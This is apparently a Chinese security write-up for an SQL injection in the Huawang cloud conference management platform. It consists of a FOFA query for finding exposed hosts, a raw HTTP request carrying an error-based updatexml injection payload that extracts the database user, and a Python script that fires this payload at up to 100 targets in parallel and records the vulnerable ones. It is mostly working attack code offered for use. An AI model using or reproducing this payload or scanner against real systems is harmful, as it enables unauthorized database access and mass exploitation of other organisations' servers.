FOFA

```markdown
title="华望云会议管理平台"
```

poc

```markdown
POST /page/conflog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1 HTTP/1.1
Host: 
Cookie: uid=112; JSESSIONID=8E8A139355E2047CEAC6B307396968A8; languageGlobal=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate


```

![image-20240925190222524](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240925190222524.png)

py脚本

```python
import argparse, sys, re, requests
from multiprocessing.dummy import Pool

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()
# 输出颜色
GREEN = '\033[92m'
RESET = '\033[0m'

# 打印程序欢迎界面
def banner():
    test = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-25
                                                    version: 1.0
                                                    author: hulless-oat
    """
    print(test)

# 主函数
def main():
    banner()  # 打印欢迎界面
    parser = argparse.ArgumentParser(description="华望云会议管理平台conflog.inc存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)  # 创建一个线程池，最大线程数为100
        mp.map(poc, url_list)  # 映射poc函数到url列表，并行执行
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload = "/page/conflog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1"
    url = target + payload
    headers = {
        'Cookie': 'uid=112; JSESSIONID=8E8A139355E2047CEAC6B307396968A8; languageGlobal=1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
    }
    try:
        res = requests.post(url=url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and 'redirectToLogin' in res.text:
            print(f"{GREEN}[+]该网站存在SQL注入漏洞：{target}\n{RESET}")
            with open("result.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")
    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口
if __name__ == '__main__':
    main()
```

